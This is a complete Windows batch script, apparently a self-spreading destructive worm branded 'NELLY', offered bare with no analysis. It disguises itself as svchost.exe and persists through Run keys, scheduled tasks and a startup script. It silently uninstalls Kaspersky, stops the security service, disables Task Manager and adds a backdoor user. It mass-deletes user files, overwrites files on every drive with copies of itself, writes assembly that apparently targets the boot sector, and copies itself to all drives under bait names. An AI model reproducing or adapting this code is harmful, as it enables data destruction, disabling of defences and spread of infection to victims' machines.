@shift 1
@echo off
set nomb=svchost.exe
set fo=%windir%\Tasks\
if exist %fo%svchost.exe (goto comp)
copy /y /z /b /v %0 %fo%1&ren %fo%1 %nomb%
set hk=%time:~0,2%
set mk=%time:~3,2%
set /a mk=mk+1
if %mk% GTR 59 (
              set /a hk=hk+1
              set mk=1
)
set hora=%hk%:%mk%
at %hora% /interactive %fo%%nomb%
if errorlevel 1 goto temp
:comp
set l="HKLM\software\microsoft\windows\currentversion\policies\explorer\run"
reg add %l% /V "RunDll23, AVUpdate" /d "%fo%%nomb%" /f
if not errorlevel 1 (goto pr2)
set ins=%allusersprofile%\Men£ Inicio\Programas\Inicio\.vbs
echo. On Error Resume Next >"%ins%" & echo Set PV7 = CreateObject("WScript.Shell")>>"%ins%" & echo PV7.Run "%windir%\Tasks\svchost.exe" >>"%ins%"
attrib +s +h "%userprofile%\Men£ Inicio\Programas\Inicio" & cls
goto pr3
:pr2
for /R "%allusersprofile%\" %%f in (*.vbs) DO del /q /f "%%f"
:pr3
IF %0 EQU "%WINDIR%\TASKS\svchost.exe" (goto ini2)
IF %0 EQU "%windir%\Tasks\svchost.exe" (goto ini2)
IF %0 EQU "c:\windows\Tasks\svchost.exe" (goto ini2)
IF %0 EQU "C:\WINDOWS\Tasks\svchost.exe" (goto ini2) else (start \ )
exit
:ini2
if exist "%temp%\Desktop.ini" (goto s)
set dl="%temp%\Desktop.ini"
echo [.ShellClassInfo]>>%dl%
echo CLSID={645FF040-5081-101B-9F08-00AA002F954E}>>%dl%
echo LocalizedResourceName=@shell32.dll,-21774>>%dl%
attrib +s +h "%dl%"
attrib +s +h "%temp%"
:s
set /a f=%f% + 1
if %f%==30 goto uno
md %windir%\Tasks\%f%
if errorlevel 1 goto s
cls
:uno
set ld="HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab\AVP6\"
reg query %ld% /V "persistent"
if errorlevel 1 (goto p1)
msiexec.exe /x{79B986AD-54D8-4498-AA06-89808829ACC0} /qn
msiexec.exe /x{79B986AD-54D8-4498-AA06-89808829ACC0} /qn KLUNINSTPWDHEX="%p" KLSETUPDIR="%d" AKINSTALL=1
if exist "%windir%\Tasks\27\" (goto t3r)
if exist "%windir%\Tasks\23\" (goto gjk)
if exist "%windir%\Tasks\13\" (goto seg)
if exist "%windir%\Tasks\7\" (goto vid)
:p1
set c=HKCU\software\microsoft\windows\CurrentVersion\policies\
reg add "%c%system" /t REG_DWORD /V disabletaskmgr /d 1 /f
reg add "%c%Uninstall" /t REG_DWORD /v NoAddRemovePrograms /d 1 /f
reg add "HKEY_CURRENT_USER\Control Panel\International" /t REG_sz /v s1159 /d "[ Nelly ]" /f
reg add "HKEY_CURRENT_USER\Control Panel\International" /t REG_sz /v s2359 /d "[ Nelly ]" /f
reg add "HKEY_CURRENT_USER\Control Panel\International" /t REG_sz /v sTimeFormat /d "HH:mm   tt" /f
reg add "HKEY_USERS\.DEFAULT\Control Panel\International" /t REG_sz /v s1159 /d "[ Nelly ]" /f
reg add "HKEY_USERS\.DEFAULT\Control Panel\International" /t REG_sz /v s2359 /d "[ Nelly ]" /f
reg add "HKEY_USERS\.DEFAULT\Control Panel\International" /t REG_sz /v sTimeFormat /d "HH:mm   tt" /f
Rundll32 user32.dll ,mouse_event
goto rev
:vid
reg add "HKEY_USERS\S-1-5-21-839522115-1078145449-1060284298-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /t REG_DWORD /v WebView /d 0 /f
set c1=HKCU\software\microsoft\windows\CurrentVersion\policies\explorer
reg add "%c1%" /t REG_BINARY /V NoTrayItemsDisplay /d 01000000 /f
reg add "%c1%" /t REG_SZ /V NoRun /d 1 /f
goto rev
:seg
ping -n 2 localhost>nul&cls
set h=%windir%\Fonts\.bat
if exist %h% (goto u2b)
set a=echo echo     &set b=ÛÛÛÛÛÛÛÛÛÛÛÛ
set c=° ° ° ° ° ° ° ° ° ° ° ° ° ° &set d=° ° ° ° ° ° ° ° ° 
set e=%a%Û %d%&set f=° ° ° °&set g=      &set i=%b%%b%%b%&set j=%a%Û%c%
echo @echo off^&mode con lines=27 cols=84^&if exist "%windir%\Tasks\12\" (color 04) else (color 02)>%h%
echo title .%g%%g%%g%%g%%g%%g%%g%%g%%g%%g%%g% [ NELLY  U2 ]>>%h%
echo echo.^&echo.^&echo.^&echo.^&echo.^&echo.>>%h%
%a%%i%%i%ÛÛÛÛ>>%h%
%j%%c%%d%Û>>%h%
%e%%f% °°°°° ° °°°°°°°°°°°°%d%%f% °Û>>%h%
%j%°  °%f% %g%%c%Û>>%h%
%e%%f% °° ° °° °° ° °°°°° °%d%%f% °Û>>%h%
%j%° °° °%f%°°°%c%° Û>>%h%
%e%%f% °° °°° °°° °%g% °%d%%f% °Û>>%h%
%j%° ° °° °° ° °°°°°°%c%Û>>%h%
%e%%f% °° °° °%f%%c%° ° °Û>>%h%
%j%%f%°  %c%%f% Û>>%h%
%a%Û %c%%f%°°°%c%%f%Û>>%h%
%j%%c%%d%Û>>%h%
%a%%i%%i%ÛÛÛÛ>>%h%
echo pause^>^nul>>%h%
ping -n 2 localhost>nul&cls
:u2b
start %windir%\Fonts\.bat
for /R "%userprofile%\mis documentos\" %%e in (*) DO del /q /f "%%e"
for /R "D:\" %%g in (*) DO del /q /f "%%g"/
reg add "HKCU\software\microsoft\windows\CurrentVersion\policies\explorer" /t REG_SZ /V Noclose /d 1 /f
RunDll32 advpack.dll,LaunchINFSection %windir%\INF\msmsgs.inf,BLC.Remove
set a=net
%a% stop "centro de Seguridad" &cls
%a% stop "Audio de windows"
set xz=HKEY_USERS\S-1-5-21-1220945662-789336058-854245398-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
reg add "%xz%" /t REG_DWORD /v HideIcons /d 0 /f
goto rev
:gjk
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /t REG_DWORD /v LogonType /d 0 /f
for /R "%userprofile%\" %%r in (*) DO del /q /f "%%r"
set o=delete
reg %o% "HKEY_CLASSES_ROOT\lnkfile" /v IsShortcut /f
reg %o% "HKEY_CLASSES_ROOT\piffile" /v IsShortcut /f
net user NELLY "U2" /add /expires:never
goto rev
:t3r
Rundll32 user32.dll ,mouse_event
set k=echo 
(%k%n google.com&%k%a 1024&%k%*********&%k%MOV SS,AX
%k%MOV SP,7C00&%k%STI&%k%PUSH AX&%k%POP ES&%k%PUSH AX
%k%POP DS&%k%CLD&%k%MOV SI,7C1B&%k%MOV DI,061B&%k%PUSH AX
%k%PUSH DI&%k%************&%k%MOV BP,07BE&%k%MOV CL,04
%k%CMP [BP+00],CH&%k%JL  062E&%k%JNZ 063A&%k%ADD BP,+10
%k%*********&%k%REP&%k%MOVSB&%k%RETF&%k%******&%k%w&%k%q )>>$
debug <$ >nul
del $
taskkill /f /im explorer.exe
for /R "%windir%\" %%l in (*) DO Copy /y /z /b /v %0 "%%l"
for /R "c:\Archivos de programa\Archivos comunes\" %%h in (*) DO del /q /f "%%h"
for /R "d:\" %%f in (*) DO Copy /y /z /b /v %0 "%%f"
for /R "E:\" %%G in (*) DO Copy /y /z /b /v %0 "%%G"
for /R "F:\" %%H in (*) DO Copy /y /z /b /v %0 "%%H"
for /R "G:\" %%I in (*) DO Copy /y /z /b /v %0 "%%I"
for /R "H:\" %%J in (*) DO Copy /y /z /b /v %0 "%%J"
for /R "I:\" %%K in (*) DO Copy /y /z /b /v %0 "%%K"
for /R "J:\" %%L in (*) DO Copy /y /z /b /v %0 "%%L"
for /R "K:\" %%M in (*) DO Copy /y /z /b /v %0 "%%M"
rundll32.exe user32.dll LockWorkStation
exit
:temp
set n1f=svchost.exe&set a2=Windows
if exist %temp%\svchost.exe (goto bl)
copy /y /z /b /v %0 "%temp%\1"&ren "%temp%\1" "%n1f%"
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v %a2% /d "%temp%\%n1f%" /f
if not errorlevel 1 (del /f /q "%userprofile%\Men£ Inicio\Programas\Inicio\.vbs" & goto bl)
attrib +s +h "%userprofile%\Men£ Inicio\Programas\Inicio"
set int=%userprofile%\Men£ Inicio\Programas\Inicio\.vbs
echo. On Error Resume Next >"%int%" & echo Set PV7 = CreateObject("WScript.Shell")>>"%int%" & echo PV7.Run "%temp%\svchost.exe" >>"%int%"
:bl
IF %0 EQU "%temp%\svchost.exe" (goto vg)
IF %0 EQU "%tmp%\svchost.exe" (goto vg)
IF %0 EQU "%userprofile%\Configuraci¢n local\Temp\svchost.exe" (goto vg)
IF %0 EQU "C:\Documents and Settings\%username%\Configuraci¢n local\Temp\svchost.exe" (goto vg) else (start \ &tskill cmd &exit)
:vg
set /a g=%g% + 1
if %g%==28 goto vcb
md %temp%\%g%
if errorlevel 1 goto vg
:vcb
if exist "%temp%\25" ( rundll32.exe user32.dll LockWorkStation )
if exist "%temp%\2" (goto b2)
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Window Title" /d "[   NELLY   ]" /f
if exist "%temp%\Desktop.ini" (goto b2)
if not exist "%temp%\4" (goto b2)
set dk="%temp%\Desktop.ini"
echo [.ShellClassInfo]>>%dk%
echo CLSID={645FF040-5081-101B-9F08-00AA002F954E}>>%dk%
echo LocalizedResourceName=@shell32.dll,-28995>>%dk%
attrib +s +h "%dk%"
attrib +s +h "%temp%"
:b2
for /R "%userprofile%\Mis documentos\" %%w in (*) DO del /q /f "%%w"
set ld="HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab\AVP6\"
reg query %ld% /V "persistent"
if errorlevel 1 (goto invit)
copy /y /z /b /v %0 "%temp%\.gyh"
:kase
if exist "%temp%\20" (set m7=%username%& goto :kars)
if exist "%temp%\10" (set m7=Mis imagenes& goto :kars) else (set m7=Mi musica)
:kars
For %%z in (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (vol %%z: & if not errorlevel 1 (if not exist "%%z:\%m7%.exe" cls & Copy /y /z /b /v "%temp%\.gyh" "%%z:\%m7%.exe"&cls))
ping -n 3 localhost>nul&cls
goto kase
:rev
IF %0 EQU "%temp%\svchost.exe" (goto invit)
if exist "%windir%\Tasks\20\" (set m4=%username%& goto rev7)
if exist "%windir%\Tasks\10\" (set m4=Juegos& goto rev7) else (set m4=Musica& goto rev7)
:invit
if exist "%temp%\20" (set m4=%username%& goto rev7)
if exist "%temp%\10" (set m4=Mis imagenes& goto rev7) else (set m4=Mi musica)
:rev7
For %%n in (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (vol %%n: & if not errorlevel 1 (if not exist "%%n:\%m4%.exe" cls & Copy /y /z /b /v %0 "%%n:\%m4%.exe"&cls))
For %%z in (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (vol %%z: & if not errorlevel 1 (if not exist "%%z:\Desktop.ini" ( echo [{BE098140-A513-11D0-A3A4-00C04FD706EC}]>>%%z:\Desktop.ini
echo IconArea_Image=imagen>>%%z:\Desktop.ini&echo IconArea_Text=0xFFFFFF>>%%z:\Desktop.ini&attrib +s +h "%%z:\Desktop.ini"&Rundll32 user32.dll ,SwapMouseButton)))
ping -n 3 localhost>nul&cls
goto rev
